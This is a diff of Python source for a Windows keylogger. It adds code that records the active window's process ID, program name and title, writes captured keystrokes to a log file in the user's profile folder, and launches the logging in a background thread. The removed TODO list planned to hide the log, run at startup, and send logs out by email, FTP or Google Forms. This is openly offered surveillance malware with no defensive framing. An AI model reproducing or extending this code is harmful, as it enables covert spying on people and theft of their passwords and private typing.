@@ -12,29 +12,79 @@ import win32api
 
 
 
-def intro():
+##def intro():
+##
+##   key_ascii=
+##    	"""
+##	 _  __             ____   _                        
+##        | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
+##        | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
+##        | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
+##        |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
+##             		|___/                                  
+##
+##
+##		 ooo,    .---.
+##		 o`  o   /    |\________________
+##		o`   'oooo()  | ________   _   _)
+##		`oo   o` \    |/        | | | |
+##		  `ooo'   `---'         "-" |_|
+##		"""
+##    print key_ascii
+##    
+#intro()
 
-   key_ascii=
-    	"""
-	 _  __             ____   _                        
-        | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
-        | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
-        | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
-        |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
-             		|___/                                  
 
 
-		 ooo,    .---.
-		 o`  o   /    |\________________
-		o`   'oooo()  | ________   _   _)
-		`oo   o` \    |/        | | | |
-		  `ooo'   `---'         "-" |_|
-		"""
-    print key_ascii
+user32 = windll.user32
+kernel32 = windll.kernel32
+psapi = windll.psapi
+current_window = ""
+logging_output = ""
+logging_date = datetime.datetime.now()
+logging_status = False
+logging_key_thread = 0
+timer = 0 
+
+file_name = os.path.join(os.path.expandvars("%userprofile%"),"Logs.txt")
+
+def save_to_file(logs):
     
-intro()
+    output_file = open(file_name,"a+")
+    output_file.write(logs)
+    output_file.close()
 
-file_logs = os.path.join(os.path.expandvars("%userprofile%"),"LOGS.txt")
+
+def get_current_process():
+
+    # get the active window handle
+    window_handle = user32.GetForegroundWindow()
+    
+    # get the acitve program process ID
+    program_pid = c_ulong(0) 
+    user32.GetWindowThreadProcessId(window_handle, byref(program_pid))
+
+    # store the current program process ID
+    process_id = "%d" % program_pid.value
+
+    # using the process id , grab the program (exe) path
+    program_path = create_string_buffer("\0x00" * 512)
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, program_pid)
+
+    psapi.GetModuleBaseNameA(h_process,None, byref(program_path), 512)
+
+    # read the active window title
+
+    window_title = create_string_buffer("\0x00" * 512)
+    length = user32.GetWindowTextA(window_handle, byref(window_title),512)
+
+    # save the window name in a file
+    save_to_file("[*] [PID: %s %s %s]" % (process_id, program_path.value, window_title.value))
+    
+    # close the hanldes
+    kernel32.CloseHandle(window_handle)
+    kernel32.CloseHandle(h_process)
+    
 
 
 def key_logging(key_thread, timer, file_name):
@@ -106,23 +156,6 @@ def capture_key_strokes(event):
     return True 
 
 
-
-
-# TO:DO
-
-# Store the logs locally 
-# Hide the file
-# Parse the loggs into readable lines
-# SEND LOGS TO EMAIL
-
-
-# Additional Features
-# Task Scheduler (windows) to run on startup.
-# datetime module to make a new log file each day.
-#Removed sys and logging imports and instead used standard file code
-#Stores each line rather than one character per line. (separates lines when enter/tab is pressed)
-#Removes characters when backspace is pressed so final output is coherent.
-#Displays (in the log), the window the text was typed into eg 'youtube', 'google', 'microsoft word'.
-# SEND LOGS TO FTP
-# SEND LOGS TO GOOGLE FORMS
-# Rewrite the function into Classes
+# begin keylogging
+kl = Thread(target=key_logging, args=(logging_key_thread,timer,file_name))
+kl.start()
